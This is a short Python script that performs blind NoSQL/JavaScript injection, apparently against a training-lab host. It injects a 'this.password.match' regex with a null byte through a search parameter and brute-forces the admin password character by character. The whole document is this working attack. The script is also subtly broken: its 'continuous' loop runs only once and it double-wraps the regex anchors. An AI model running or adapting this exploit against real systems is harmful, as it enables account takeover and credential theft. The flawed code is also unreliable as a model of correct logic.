import urllib.request
import string

# Base URL 
URL = "http://ptl-f438bcfb9374-59859790da0b.libcurl.me/"

def check(current_guess):
    # URL with the current guess
    url = URL + f"?search=admin%27%00%26%26this.password.match(/^{current_guess}.*$/)%00"
    print(f"Checking: {url}")
    resp = urllib.request.urlopen(url)
    data = resp.read()

    # Replace this with the actual success indicator from the server's response
    success_indicator = ">admin</a"
    return success_indicator in str(data)

CHARSET = string.ascii_uppercase + string.ascii_lowercase + string.digits
password = ""

# Start with empty pass + try to append characters one by one
for c in CHARSET:
    # Form the current guess by appending the character to the already discovered part of the password
    current_guess = password + c
    print(f"Trying: {current_guess}")

    # Use the check function to see if the current guess is part of the password
    if check(current_guess):
        print(f"Found a character: {c}")
        password += c  # Append the character to the password
        break  # If you're looking to find a single character at a time, break after each find

# After the loop, print the discovered part of the password
print(f"Discovered part of the password: {password}")

# Continuously loop
if True:
    # Iterate over each character in the character set
    for c in CHARSET:
        # Print the current attempt
        print("Trying: " + c + " for " + password)

        # Append the current character to the password
        test = password + c

        # Check if the current combination is correct
        if check("^" + test + ".*$"):
            # If correct, update the password and print it
            password += c
            print(f"Found a character: {c}")
            # The break applies to the inner for-loop
            break
        
    # Check if the last character of CHARSET is reached without finding a match
    if c == CHARSET[-1]:
        # If you've gone through all characters and found nothing
        print("No more characters to test, exiting.")
        

# After the loop, print the discovered part of the password
print(f"Discovered part of the password: {password}")
